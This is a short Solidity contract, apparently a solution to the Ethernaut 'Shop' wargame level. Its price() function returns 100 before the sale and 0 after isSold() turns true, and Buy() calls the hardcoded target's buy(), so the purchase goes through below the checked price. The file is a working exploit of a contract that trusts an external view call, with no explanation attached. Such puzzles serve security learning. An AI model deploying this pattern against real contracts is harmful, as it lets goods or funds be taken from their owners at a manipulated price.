// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract Buyer {
    address constant _target = 0x8D5222e2892254DEF852141d9437829fAb11A86C;

      function price() external view returns (uint){
        Shop target = Shop(_target);
        uint purchasePrice = 100;
        if(!(target.isSold())){
            return purchasePrice;
        }else{
            return 0;
        }
      }

      function Buy() external{
        Shop target = Shop(_target);
        target.buy();

      }
    
}